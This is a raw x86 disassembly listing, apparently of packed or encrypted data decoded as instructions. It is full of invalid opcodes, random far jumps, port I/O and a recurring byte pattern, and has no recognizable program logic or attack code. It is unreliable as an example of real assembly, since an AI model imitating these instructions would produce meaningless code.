  42f7b2:	sbb    eax,0x4277fc39
  42f7b7:	sbb    eax,0x35fa4ba8
  42f7bc:	mov    eax,DWORD PTR [ebx+eiz*1+0xb]
  42f7c0:	outs   dx,DWORD PTR ds:[esi]
	...
  42f831:	add    BYTE PTR [eax],al
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x4af3771]
  42f841:	cwde   
  42f842:	pusha  
  42f843:	sbb    BYTE PTR [eax-0xb],0x1
  42f847:	add    ch,dh
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    al,cl
  42f84d:	sub    BYTE PTR [ecx+0x8e11fbb],bl
  42f853:	addr16 mov eax,ds:0x437b
  42f857:	ins    BYTE PTR es:[edi],dx
  42f858:	cs out dx,al
  42f85a:	data16 and BYTE PTR ds:0xe2efc403,dl
  42f861:	lock repnz int3 
  42f864:	lock mov ecx,0x75ddcfab
  42f86a:	jp     0x42f8dc
  42f86c:	xor    DWORD PTR [esi-0x2b73fea2],ebx
  42f872:	inc    esi
  42f873:	neg    cl
  42f875:	jmp    0x42f890
  42f877:	cmp    al,0xda
  42f879:	xor    eax,0x1992b100
  42f87e:	mov    ebp,0x1b56c425
  42f883:	mov    dl,0xbe
  42f885:	xchg   ebx,eax
  42f886:	sub    edi,ebx
  42f888:	mov    bl,0x4d
  42f88a:	xchg   BYTE PTR [ebx+0x68],dl
  42f88d:	jmp    0x3ba0:0xc90695d9
  42f894:	inc    DWORD PTR [edx]
  42f896:	inc    ebp
  42f897:	out    0xb4,eax
  42f899:	aad    0x41
  42f89b:	add    DWORD PTR [edi],edi
  42f89d:	adc    ch,BYTE PTR [edi+0x2fd9c19a]
  42f8a3:	popa   
  42f8a4:	jmp    DWORD PTR [eax]
  42f8a6:	scas   al,BYTE PTR es:[edi]
  42f8a7:	push   0xffffffb5
  42f8a9:	out    dx,eax
  42f8aa:	jge    0x42f8b8
  42f8ac:	into   
  42f8ad:	jmp    FWORD PTR [edi+0x7d]
  42f8b0:	cdq    
  42f8b1:	jnp    0x42f90a
  42f8b3:	inc    eax
  42f8b4:	imul   edx,DWORD PTR [esi-0x2b274019],0x847c31a8
  42f8be:	add    dl,BYTE PTR [ebx+0x3d153817]
  42f8c4:	mov    bh,0x63
  42f8c6:	shr    dh,0x5a
  42f8c9:	stos   BYTE PTR es:[edi],al
  42f8ca:	mov    eax,0x5166734e
  42f8cf:	xchg   esp,eax
  42f8d0:	data16 (bad) 
  42f8d2:	xchg   ebp,eax
  42f8d3:	into   
  42f8d4:	inc    eax
  42f8d5:	push   edx
  42f8d6:	push   0x528a7958
  42f8db:	loop   0x42f8e2
  42f8dd:	mov    eax,ds
  42f8df:	or     eax,0x95974a7a
  42f8e4:	add    al,0xee
  42f8e6:	ins    DWORD PTR es:[edi],dx
  42f8e7:	or     bl,BYTE PTR [ecx+ebp*8+0x11]
  42f8eb:	and    al,BYTE PTR [ebx]
  42f8ed:	out    dx,al
  42f8ee:	cli    
  42f8ef:	dec    ebp
  42f8f0:	sub    eax,0x6924d799
  42f8f5:	adc    BYTE PTR [esi+0x2160d901],al
  42f8fb:	pusha  
  42f8fc:	enter  0x7f6d,0x9f
  42f900:	cmp    eax,0xb54317fd
  42f905:	push   cs
  42f906:	and    al,0xc4
  42f908:	jb     0x42f92b
  42f90a:	mov    ch,0xff
  42f90c:	xchg   edi,eax
  42f90d:	dec    eax
  42f90e:	mov    BYTE PTR [edx+ebx*4+0x4a],0x6f
  42f913:	dec    esp
  42f914:	cli    
  42f915:	add    edx,esi
  42f917:	mov    ebp,0xecf6c49
  42f91c:	sbb    al,0x81
  42f91e:	or     eax,0x84fde77c
  42f923:	out    dx,eax
  42f924:	sub    BYTE PTR [ebp+0x2e],dh
  42f927:	push   edi
  42f928:	inc    esp
  42f929:	test   DWORD PTR [ebx-0x38],esp
  42f92c:	test   DWORD PTR [edi],ebp
  42f92e:	mov    ds:0xc43bc3c,eax
  42f933:	or     BYTE PTR [ebp+0x490246c3],bl
  42f939:	xlat   BYTE PTR ds:[ebx]
  42f93a:	lock xor al,0xd9
  42f93d:	mov    dh,0x3b
  42f93f:	sbb    ax,0x0
	...
  42f9b3:	add    ch,ah
  42f9b5:	mov    edx,0xebdfe392
  42f9ba:	cmc    
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	pop    ebp
  42f9c1:	mov    ds:0xf64d0ade,eax
  42f9c6:	add    DWORD PTR [eax],eax
  42f9c8:	cmc    
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [edx-0x718a8941],ch
  42f9d1:	cli    
  42f9d2:	jns    0x42fa0d
  42f9d4:	aaa    
  42f9d5:	ds mov bh,0x4b
  42f9d8:	sub    al,BYTE PTR [esi+0x43]
  42f9db:	mov    esi,0x4183d425
  42f9e0:	cli    
  42f9e1:	sbb    ebp,DWORD PTR [ebx-0x57]
  42f9e4:	inc    esi
  42f9e5:	adc    DWORD PTR [esi+0x64],0x456692cb
  42f9ec:	or     ebp,DWORD PTR [eax-0x47]
  42f9ef:	cmp    eax,0x4a2f289d
  42f9f4:	mov    eax,ds:0x8e86bc83
  42f9f9:	loopne 0x42fa21
  42f9fb:	ins    BYTE PTR es:[edi],dx
  42f9fc:	mov    bh,bl
  42f9fe:	sbb    BYTE PTR [ebx-0x30],dl
  42fa01:	gs es loop 0x42fa22
  42fa05:	int3   
  42fa06:	data16 and bl,ch
  42fa09:	add    cl,0xa1
  42fa0c:	lods   al,BYTE PTR ds:[esi]
  42fa0d:	inc    ebx
  42fa0e:	ss push ebx
  42fa10:	(bad)  
  42fa11:	cwde   
  42fa12:	(bad)  
  42fa13:	mov    ch,0xc7
  42fa15:	xlat   BYTE PTR ds:[ebx]
  42fa16:	ss pop ss
  42fa18:	bound  ebx,QWORD PTR ds:0x5c4b4002
  42fa1e:	jp     0x42f9e1
  42fa20:	ss mov al,0x37
  42fa23:	and    DWORD PTR [edx+eiz*4],eax
  42fa26:	ffree  st(1)
  42fa28:	pop    DWORD PTR [esi+ebp*2-0x7aaaa20c]
  42fa2f:	cmp    ecx,DWORD PTR [eax+0x39]
  42fa32:	mov    edi,0xdb968e98
  42fa37:	mov    ebx,DWORD PTR [ebx-0x654ce03b]
  42fa3d:	jnp    0x42fa66
  42fa3f:	sub    esi,DWORD PTR [edi+edx*8+0x6e]
  42fa43:	pop    ebp
  42fa44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa45:	les    ebx,FWORD PTR [edi+0x58]
  42fa48:	inc    eax
  42fa49:	cdq    
  42fa4a:	icebp  
  42fa4b:	cmp    DWORD PTR [esi+0x7b7accc8],eax
  42fa51:	xchg   esp,eax
  42fa52:	pop    edx
  42fa53:	push   ebp
  42fa54:	pop    eax
  42fa55:	pop    ebx
  42fa56:	je     0x42fac6
  42fa58:	mov    bh,0x75
  42fa5a:	pop    ebx
  42fa5b:	push   esp
  42fa5c:	mov    edi,0x69801079
  42fa61:	xor    eax,0x54294b1c
  42fa66:	je     0x42fa91
  42fa68:	out    0x59,al
  42fa6a:	mov    edx,0x1e5ef803
  42fa6f:	xchg   ebp,eax
  42fa70:	dec    esi
  42fa71:	jle    0x42faef
  42fa73:	xchg   esp,eax
  42fa74:	add    eax,0x3036f1c
  42fa79:	mov    dh,0x6f
  42fa7b:	fiadd  WORD PTR [edx+0x7c]
  42fa7e:	sbb    DWORD PTR [ecx],0xffffffff
  42fa81:	xchg   ebp,eax
  42fa82:	push   es
  42fa83:	mov    esp,0x586a2540
  42fa88:	arpl   sp,di
  42fa8a:	shufps xmm2,XMMWORD PTR [ecx],0x60
  42fa8e:	and    al,0xe
  42fa90:	popa   
  42fa91:	push   0x3c
  42fa93:	test   BYTE PTR [esi],bl
  42fa95:	or     BYTE PTR [eax+0x70],ah
  42fa98:	retf   0xd135
  42fa9b:	pop    edx
  42fa9c:	shr    al,1
  42fa9e:	lods   eax,DWORD PTR ds:[esi]
  42fa9f:	add    eax,0xff1545f7
  42faa4:	fcmovne st,st(1)
  42faa6:	mov    esi,0x5c14cca4
  42faab:	das    
  42faac:	pusha  
  42faad:	jbe    0x42faaf
  42faaf:	rcr    BYTE PTR [esi+0x1a],cl
  42fab2:	inc    esi
  42fab3:	push   ebx
  42fab4:	dec    esp
  42fab5:	pop    esi
  42fab6:	lods   al,BYTE PTR ds:[esi]
  42fab7:	lods   eax,DWORD PTR ds:[esi]
  42fab8:	inc    edx
  42fab9:	stos   DWORD PTR es:[edi],eax
  42faba:	js     0x42fa40
  42fabc:	adc    DWORD PTR [edi+0x77efb5],ebx
	...
  42fb32:	add    BYTE PTR [eax],al
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	mov    ah,0x71
  42fb42:	repnz rol BYTE PTR [edx-0x9],1
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	cmc    
  42fb49:	add    BYTE PTR [eax],al
  42fb4b:	add    BYTE PTR [ecx-0x30fb40af],ah
  42fb51:	xor    ah,dl
  42fb53:	xchg   ecx,eax
  42fb54:	xchg   esp,eax
  42fb55:	jo     0x42faf5
  42fb57:	cmp    DWORD PTR [ecx-0x303aa716],ebx
  42fb5d:	fwait
  42fb5e:	mov    eax,0xa0c7e498
  42fb63:	jl     0x42fb00
  42fb65:	(bad)  
  42fb66:	hlt    
  42fb67:	cmp    ebx,DWORD PTR [esi+edi*1-0x4185fb32]
  42fb6e:	dec    esp
  42fb6f:	xchg   esp,eax
  42fb70:	sbb    al,0xf7
  42fb72:	retf   
  42fb73:	sub    eax,0x8e8977a4
  42fb78:	int3   
  42fb79:	out    0x52,eax
  42fb7b:	sub    eax,0xcd4ac851
  42fb80:	and    al,0x35
  42fb82:	ficomp DWORD PTR [edi]
  42fb84:	jg     0x42fbad
  42fb86:	add    dl,BYTE PTR [edx+0x439cd6f0]
  42fb8c:	jmp    0x5049:0x95eb426f
  42fb93:	xor    edi,DWORD PTR [edx]
  42fb95:	in     al,0xcf
  42fb97:	push   ss
  42fb98:	push   eax
  42fb99:	sbb    eax,esi
  42fb9b:	xlat   BYTE PTR ds:[ebx]
  42fb9c:	push   ds
  42fb9d:	bound  edi,QWORD PTR ds:0x95938ac6
  42fba3:	fadd   st,st(3)
  42fba5:	mov    edi,0x277622f9
  42fbaa:	sub    al,0xd2
  42fbac:	jns    0x42fc29
  42fbae:	adc    esp,DWORD PTR [edx]
  42fbb0:	sub    BYTE PTR [ebx-0x2aab03b2],dl
  42fbb6:	xor    eax,0x9aa78c40
  42fbbb:	xchg   edx,eax
  42fbbc:	ret    0xbe41
  42fbbf:	repz repz mov edi,0xfad35658
  42fbc6:	dec    esi
  42fbc7:	push   esi
  42fbc8:	pop    es
  42fbc9:	jns    0x42fb88
  42fbcb:	sbb    DWORD PTR [edx+0x63],ebp
  42fbce:	add    dl,ah
  42fbd0:	pop    ecx
  42fbd1:	mov    ebx,0x2df5daaf
  42fbd6:	fcom   QWORD PTR [ecx*4-0x1bc46c33]
  42fbdd:	dec    ecx
  42fbde:	xor    al,0x69
  42fbe0:	sahf   
  42fbe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbe2:	push   eax
  42fbe3:	shl    BYTE PTR [ebx+0x6ca82b15],0x26
  42fbea:	adc    bl,ah
  42fbec:	fild   QWORD PTR [ecx+eax*8-0x32]
  42fbf0:	out    0x60,eax
  42fbf2:	test   eax,0x2a7e984
  42fbf7:	push   ss
  42fbf8:	dec    ebx
  42fbf9:	sbb    BYTE PTR [esi+eax*8],cl
  42fbfc:	outs   dx,DWORD PTR ds:[esi]
  42fbfd:	mov    eax,0xaa7a319
  42fc02:	xlat   BYTE PTR ds:[ebx]
  42fc03:	pop    ss
  42fc04:	pop    edx
  42fc05:	push   ebx
  42fc06:	pusha  
  42fc07:	mov    eax,0x3162c568
  42fc0c:	loopne 0x42fc10
  42fc0e:	jno    0x42fb91
  42fc10:	jge    0x42fbe8
  42fc12:	lea    esp,[ebp-0x2deddd6c]
  42fc18:	jmp    0x9999:0x137c2d85
  42fc1f:	adc    BYTE PTR [edx],dl
  42fc21:	aam    0xbd
  42fc23:	mov    bl,0x18
  42fc25:	adc    cl,dl
  42fc27:	scas   eax,DWORD PTR es:[edi]
  42fc28:	call   0xcc0c:0xe0708758
  42fc2f:	nop
  42fc30:	adc    ch,bh
  42fc32:	mov    edi,DWORD PTR [esi-0x265b9d41]
  42fc38:	push   ds
  42fc39:	or     ebx,DWORD PTR [eax-0x31]
  42fc3c:	push   ecx
  42fc3d:	inc    esp
  42fc3e:	retf   
  42fc3f:	add    al,0xc9
	...
  42fcb1:	add    BYTE PTR [eax],al
  42fcb3:	add    BYTE PTR [edx],ch
  42fcb5:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42fcbb:	test   BYTE PTR [ecx+0x78b95c3c],0xab
  42fcc2:	mov    dl,0x62
  42fcc4:	aaa    
  42fcc5:	clc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	cmc    
  42fcc9:	add    BYTE PTR [eax],al
  42fccb:	add    BYTE PTR [edx],bl
  42fccd:	pop    es
  42fcce:	in     eax,0xb
  42fcd0:	push   ebp
  42fcd1:	cdq    
  42fcd2:	dec    eax
  42fcd3:	in     eax,0x7
  42fcd5:	jg     0x42fce9
  42fcd7:	jno    0x42fcd1
  42fcd9:	xor    esp,ebx
  42fcdb:	loop   0x42fc7e
  42fcdd:	and    bh,ch
  42fcdf:	sub    al,0xaf
  42fce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fce2:	mov    edx,0xf2b13cd6
  42fce7:	inc    esp
  42fce8:	sbb    BYTE PTR [edi],al
  42fcea:	ror    BYTE PTR [eax+0x1288f1d5],cl
  42fcf0:	stos   BYTE PTR es:[edi],al
  42fcf1:	dec    esp
  42fcf2:	js     0x42fd04
  42fcf4:	fisttp DWORD PTR [esi-0x4208bf25]
  42fcfa:	push   eax
  42fcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcfc:	ins    DWORD PTR es:[edi],dx
  42fcfd:	mov    ecx,?
  42fcff:	push   es
  42fd00:	ins    BYTE PTR es:[edi],dx
  42fd01:	mov    dh,0x70
  42fd03:	add    al,0x4
  42fd05:	adc    eax,0x9095c343
  42fd0a:	aas    
  42fd0b:	in     al,0x73
  42fd0d:	push   ebp
  42fd0e:	pop    ds
  42fd0f:	addr16 xchg esi,eax
  42fd11:	mov    dh,0xe0
  42fd13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd14:	mov    bl,0x18
  42fd16:	sub    BYTE PTR [eax],0xd5
  42fd19:	cmp    eax,0xbb1cc0fc
  42fd1e:	ins    DWORD PTR es:[edi],dx
  42fd1f:	add    DWORD PTR [eax+0x22bc17ca],edx
  42fd25:	xchg   esi,eax
  42fd26:	mov    eax,0x75c45d38
  42fd2b:	xchg   BYTE PTR [esi-0x35],bl
  42fd2e:	push   cs
  42fd2f:	jns    0x42fd1a
  42fd31:	test   eax,0xc99e8d04
  42fd36:	mov    DWORD PTR [eax],esp
  42fd38:	fcom   DWORD PTR [ebx-0x354d2dde]
  42fd3e:	mov    ebx,0x1833c641
  42fd43:	dec    eax
  42fd44:	(bad)  
  42fd45:	sbb    esp,DWORD PTR [ebp+0x1b]
  42fd48:	or     BYTE PTR [edi],ch
  42fd4a:	xor    BYTE PTR [eax+0x78],0x61
  42fd4e:	shr    DWORD PTR [eax-0x2f],cl
  42fd51:	jmp    0xe58318e6
  42fd56:	icebp  
  42fd57:	loope  0x42fd7b
  42fd59:	out    dx,eax
  42fd5a:	push   edi
  42fd5b:	cmp    BYTE PTR [edi-0x7a],bl
  42fd5e:	push   edx
  42fd5f:	ret    0x995a
  42fd62:	lock pop edi
  42fd64:	xlat   BYTE PTR ds:[ebx]
  42fd65:	js     0x42fdb9
  42fd67:	pusha  
  42fd68:	outs   dx,BYTE PTR ds:[esi]
  42fd69:	sti    
  42fd6a:	scas   eax,DWORD PTR es:[edi]
  42fd6b:	fwait
  42fd6c:	call   0x3d57:0x1839fb2c
  42fd73:	mov    eax,0x83ba068a
  42fd78:	xchg   DWORD PTR [ecx+0x49d2cd1f],esi
  42fd7e:	std    
  42fd7f:	cs retf 0x5804
  42fd83:	inc    esi
  42fd84:	pop    ss
  42fd85:	ret    
  42fd86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd87:	sbb    DWORD PTR es:[eax-0x2f],0xffffffba
  42fd8c:	xchg   ecx,eax
  42fd8d:	shr    BYTE PTR [ebx-0x56],cl
  42fd90:	cli    
  42fd91:	jp     0x42fdba
  42fd93:	call   0x739b:0x748ee5a7
  42fd9a:	mov    al,ds:0x77ce9bc
  42fd9f:	push   cs
  42fda0:	xchg   BYTE PTR [ecx-0x62b4c63e],dl
  42fda6:	or     esi,edx
  42fda8:	xchg   edx,eax
  42fda9:	push   esp
  42fdaa:	cmp    DWORD PTR [edx*1+0x5d47e611],ebp
  42fdb1:	and    ebp,eax
  42fdb3:	retf   0x2e6b
  42fdb6:	mov    ecx,0xb4035c83
  42fdbb:	mov    al,0x52
  42fdbd:	icebp  
  42fdbe:	retf   0xe855
	...
  42fe31:	add    BYTE PTR [eax],al
  42fe33:	add    bl,al
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	mov    cl,0x8d
  42fe42:	jbe    0x42fe55
  42fe44:	sub    al,0xf9
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	cmc    
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    BYTE PTR [ecx-0x40fc9a97],dh
  42fe51:	out    dx,al
  42fe52:	mov    ch,0x23
  42fe54:	jae    0x42fe76
  42fe56:	ds stos DWORD PTR es:[edi],eax
  42fe58:	retf   0xeb34
  42fe5b:	loop   0x42fdff
  42fe5d:	or     bh,BYTE PTR [edi-0x19aa8ab3]
  42fe63:	repz mov ebx,0x9dcc3b3e
  42fe69:	adc    DWORD PTR [ebx],ecx
  42fe6b:	inc    ebx
  42fe6c:	adc    BYTE PTR [ecx],al
  42fe6e:	push   cs
  42fe6f:	xchg   edi,eax
  42fe70:	jns    0x42fe25
  42fe72:	xchg   esp,eax
  42fe73:	hlt    
  42fe74:	mov    cl,0x80
  42fe76:	imul   edi,DWORD PTR [esi-0x6d7f1c7e],0xffffff86
  42fe7d:	jl     0x42fe78
  42fe7f:	dec    ebx
  42fe80:	rcr    cl,0xc0
  42fe83:	bound  ebx,QWORD PTR [edi]
  42fe85:	mov    bh,0xd0
  42fe87:	dec    esp
  42fe88:	(bad)  
  42fe89:	cmp    esp,DWORD PTR [ebx-0x22]
  42fe8c:	push   edi
  42fe8d:	or     DWORD PTR [edx+edi*2],esp
  42fe90:	mov    esp,DWORD PTR [ebx]
  42fe92:	pop    esp
  42fe93:	lds    eax,FWORD PTR [edi-0x4c61199e]
  42fe99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe9a:	xchg   DWORD PTR [edx+ebx*8],edx
  42fe9d:	add    edi,DWORD PTR [ebx+eax*8+0x48]
  42fea1:	(bad)  
  42fea3:	dec    esp
  42fea4:	std    
  42fea5:	repnz xchg ebp,eax
  42fea7:	sub    eax,0x8f166664
  42feac:	js     0x42fe44
  42feae:	arpl   si,dx
  42feb0:	mov    ebx,0x19ed785f
  42feb5:	mov    eax,DWORD PTR [esi+0x5f]
  42feb8:	push   cs
  42feb9:	cmp    edi,ebp
  42febb:	(bad)  ds:0x12a9243a
  42fec1:	pop    ecx
  42fec2:	jmp    0x42fec9
  42fec4:	xchg   edi,eax
  42fec5:	shl    BYTE PTR [esi+edx*1-0x64ff7307],1
  42fecc:	out    dx,eax
  42fecd:	(bad)  
  42fece:	in     eax,0xb
  42fed0:	inc    edi
  42fed1:	stc    
  42fed2:	shl    edi,0x66
  42fed5:	es icebp 
  42fed7:	(bad)  
  42fed8:	not    BYTE PTR [eax]
  42feda:	pop    edi
  42fedb:	xor    DWORD PTR [edx],eax
  42fedd:	jae    0x42ff38
  42fedf:	push   ss
  42fee0:	arpl   WORD PTR [esi-0x71],dx
  42fee3:	mov    bh,0x5c
  42fee5:	mov    bl,0x6c
  42fee7:	xchg   ebp,eax
  42fee8:	and    eax,0x65c80233
  42feed:	arpl   WORD PTR [eax+eax*4-0x45],dx
  42fef1:	push   ds
  42fef2:	jp     0x42ff22
  42fef4:	mov    esi,0x9ed300d8
  42fef9:	outs   dx,DWORD PTR ds:[esi]
  42fefa:	mov    edi,0x10d5ffcb
  42feff:	ds jle 0x42ff15
  42ff02:	test   BYTE PTR [edx-0xb],0xbb
  42ff06:	adc    eax,ebx
  42ff08:	inc    ebx
  42ff09:	jno    0x42ff10
  42ff0b:	nop
  42ff0c:	das    
  42ff0d:	into   
  42ff0e:	call   0x36c66052
  42ff13:	mov    ebx,ds
  42ff15:	loop   0x42fed9
  42ff17:	pop    ds
  42ff18:	fnstcw WORD PTR [ecx+0x4c]
  42ff1b:	dec    edx
  42ff1c:	popa   
  42ff1d:	sbb    al,0xf6
  42ff1f:	pop    ebp
  42ff20:	fidiv  DWORD PTR [eax]
  42ff22:	and    eax,0x497d39a3
  42ff27:	in     al,dx
  42ff28:	ss std 
  42ff2a:	fisub  DWORD PTR [ebx]
  42ff2c:	loope  0x42ff45
  42ff2e:	(bad)  
  42ff2f:	in     eax,dx
  42ff30:	dec    ebx
  42ff31:	xchg   ecx,eax
  42ff32:	adc    al,0x47
  42ff34:	inc    ebx
  42ff35:	or     ah,BYTE PTR [esi+0x2d]
  42ff38:	sub    al,0x12
  42ff3a:	jbe    0x42fefe
  42ff3c:	cli    
  42ff3d:	fsub   DWORD PTR [edx+0x57]
  42ff40:	fild   DWORD PTR [eax]
	...
  42ffb2:	add    BYTE PTR [eax],al
  42ffb4:	adc    bh,BYTE PTR [esi]
  42ffb6:	int    0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0x7b768016]
  42ffc1:	mov    BYTE PTR [ebx+eiz*2+0x21],al
  42ffc5:	cli    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	cmc    
  42ffc9:	add    BYTE PTR [eax],al
  42ffcb:	add    BYTE PTR [eax+eiz*2+0x1e],ch
  42ffcf:	mov    es,WORD PTR [ecx-0x32]
  42ffd2:	mov    bl,0x5
  42ffd4:	(bad)  
  42ffd6:	inc    ebp
  42ffd7:	push   edx
  42ffd8:	adc    cl,BYTE PTR [ebp-0xf]
  42ffdb:	aam    0x64
  42ffdd:	jmp    0x42fff5
  42ffdf:	mov    dh,0xa6
  42ffe1:	mov    eax,ss:0x88743223
  42ffe7:	xchg   edi,eax
  42ffe8:	dec    ecx
  42ffe9:	jp     0x43003d
  42ffeb:	test   BYTE PTR [ecx+0xacf2dad],dh
  42fff1:	or     BYTE PTR [esi+0x3bc13daa],dh
  42fff7:	cs into 
  42fff9:	add    edx,DWORD PTR [edx]
  42fffb:	or     BYTE PTR [esi-0x6a],bh
  42fffe:	jp     0x42ff95
  430000:	sub    bh,BYTE PTR [edx+0xf]
  430003:	(bad)  
  430005:	push   edi
  430006:	and    al,BYTE PTR [ebx+ebp*4+0x23]
  43000a:	jg     0x43006f
  43000c:	inc    esi
  43000d:	loope  0x430005
  43000f:	cdq    
  430010:	pop    esp
  430011:	lods   al,BYTE PTR ds:[esi]
  430012:	mov    al,ds:0x51136730
  430017:	popa   
  430018:	dec    esi
  430019:	dec    esp
  43001a:	not    DWORD PTR ds:0x55161b4a
  430020:	test   eax,0x67fa5e28
  430025:	cmp    edx,DWORD PTR [ecx-0x14]
  430028:	and    edi,DWORD PTR [edi+eiz*8+0x77d37e4]
  43002f:	jae    0x4300af
  430031:	adc    ebp,DWORD PTR [eax-0x37]
  430034:	cdq    
  430035:	int    0x5b
  430037:	in     al,0x25
  430039:	jae    0x43003a
  43003b:	jl     0x430032
  43003d:	mov    ebx,DWORD PTR [ebp-0x701cbb14]
  430043:	js     0x43002a
  430045:	mov    dl,0x5c
  430047:	dec    ebx
  430048:	pushf  
  430049:	mov    edi,0x6aee4a64
  43004e:	xor    al,0x59
  430050:	jge    0x42ffe8
  430052:	jne    0x4300a1
  430054:	out    dx,al
  430055:	mov    gs,WORD PTR [ebx+eiz*1-0x38e46a80]
  43005c:	mov    edx,0x97cd7dfd
  430061:	(bad)  
  430062:	dec    ebx
  430063:	scas   al,BYTE PTR es:[edi]
  430064:	inc    edi
  430065:	std    
  430066:	int    0x97
  430068:	xor    DWORD PTR [eax+ebx*4+0x1099cebf],esp
  43006f:	mov    edi,0x6d64af19
  430074:	mov    al,ds:0xfb587883
  430079:	fldenv [edx+0x6b1dc9f]
  43007f:	inc    ebp
  430080:	neg    DWORD PTR [ecx]
  430082:	mov    eax,ds:0x6859a857
  430087:	fdiv   QWORD PTR [ecx-0x56]
  43008a:	inc    esi
  43008b:	(bad)  
  43008c:	aad    0xef
  43008e:	inc    esp
  43008f:	outs   dx,DWORD PTR ds:[esi]
  430090:	repnz mov bh,0xb8
  430093:	ins    DWORD PTR es:[edi],dx
  430094:	pop    ss
  430095:	dec    esp
  430096:	sahf   
  430097:	clc    
  430098:	xchg   esp,eax
  430099:	sbb    dh,bh
  43009b:	icebp  
  43009c:	and    ah,BYTE PTR [eax]
  43009e:	call   0xf3e7:0x72e11e84
  4300a5:	xor    dh,BYTE PTR [esi-0x6dc919be]
  4300ab:	jbe    0x430057
  4300ad:	sti    
  4300ae:	sub    esi,DWORD PTR [edi-0x41]
  4300b1:	dec    ebx
  4300b2:	inc    ebx
  4300b3:	cmp    ebx,DWORD PTR ds:0x71f70fe5
  4300b9:	fdiv   QWORD PTR [ecx+ebp*4-0x2c]
  4300bd:	ret    0xbdbc
  4300c0:	add    BYTE PTR fs:[eax],al
	...
  430133:	add    BYTE PTR [edx+0x26],bl
  430136:	jecxz  0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x15bc:0xdd4ba608
  430144:	push   ss
  430145:	sti    
  430146:	add    DWORD PTR [eax],eax
  430148:	cmc    
  430149:	add    BYTE PTR [eax],al
  43014b:	add    cl,ch
  43014d:	cwde   
  43014e:	loope  0x430130
  430150:	pop    ss
  430151:	add    eax,DWORD PTR [eax-0x68530c76]
  430157:	aam    0xc2
  430159:	pushf  
  43015a:	ja     0x4300e2
  43015c:	pop    ds
  43015d:	cmp    ebp,esp
  43015f:	pop    edi
  430160:	test   BYTE PTR [esi+0x120e02d7],ah
  430166:	mov    eax,ds:0xd78ce829
  43016b:	cmp    DWORD PTR [ecx-0x64f8bbeb],esp
  430171:	and    DWORD PTR [ebp+0x6d],ecx
  430174:	(bad)  
  430175:	jmp    0x516207ab
  43017a:	and    eax,0x143632e4
  43017f:	pop    ds
  430180:	dec    ebx
  430181:	add    eax,0xe9491161
  430186:	inc    esp
  430187:	cmc    
  430188:	sbb    ecx,DWORD PTR [edi]
  43018a:	pop    ecx
  43018b:	imul   edi,DWORD PTR [ebx],0xa1f85b63
  430191:	dec    edx
  430192:	mov    WORD PTR [edx+ecx*4+0x2],es
  430196:	in     eax,0x82
  430198:	ror    DWORD PTR [eax],0x19
  43019b:	pop    ss
  43019c:	push   ecx
  43019d:	(bad)  
  43019f:	lock fst QWORD PTR [ebx-0x30281dc1]
  4301a6:	(bad)  
  4301a7:	or     edx,DWORD PTR [esi-0x7ed7711a]
  4301ad:	cmp    eax,0xda99fb14
  4301b2:	ja     0x4301c4
  4301b4:	inc    edi
  4301b5:	xchg   esp,eax
  4301b6:	sub    al,0x4f
  4301b8:	pop    edi
  4301b9:	imul   edx,DWORD PTR [edi],0x8a4db24d
  4301bf:	sti    
  4301c0:	sub    ecx,DWORD PTR [ecx]
  4301c2:	and    BYTE PTR [edi+0x5f87e8be],bh
  4301c8:	sbb    al,0xca
  4301ca:	pop    ecx
  4301cb:	int3   
  4301cc:	push   edi
  4301cd:	mov    dl,0xfa
  4301cf:	sbb    edx,DWORD PTR [eax-0x21]
  4301d2:	xchg   ecx,eax
  4301d3:	stos   BYTE PTR es:[edi],al
  4301d4:	es inc edx
  4301d6:	dec    esi
  4301d7:	push   ss
  4301d8:	cmovne ebx,ecx
  4301db:	aad    0x8
  4301dd:	cmp    BYTE PTR [edi],0xb7
  4301e0:	push   0xffffffe5
  4301e2:	pop    ecx
  4301e3:	cmc    
  4301e4:	cmp    dl,BYTE PTR [edi-0x53]
  4301e7:	out    0x5c,eax
  4301e9:	test   DWORD PTR [edx+0x55],ebx
  4301ec:	(bad)  
  4301ed:	mov    esi,0xc1931f99
  4301f2:	pop    edi
  4301f3:	lock inc eax
  4301f5:	icebp  
  4301f6:	fdiv   QWORD PTR [edx]
  4301f8:	fisttp DWORD PTR [ecx-0x75]
  4301fb:	push   ebx
  4301fc:	or     edx,edi
  4301fe:	inc    esp
  4301ff:	jl     0x430232
  430201:	mov    eax,0x54b75093
  430206:	mov    bl,0x50
  430208:	arpl   ax,dx
  43020a:	(bad)  
  43020b:	mov    dl,0x45
  43020d:	push   edx
  43020e:	adc    cl,BYTE PTR [ecx]
  430210:	xor    eax,0xd0a91033
  430215:	in     eax,dx
  430216:	lods   eax,DWORD PTR ds:[esi]
  430217:	das    
  430218:	sub    ch,BYTE PTR [ebp-0x8]
  43021b:	leave  
  43021c:	add    bl,BYTE PTR [edx]
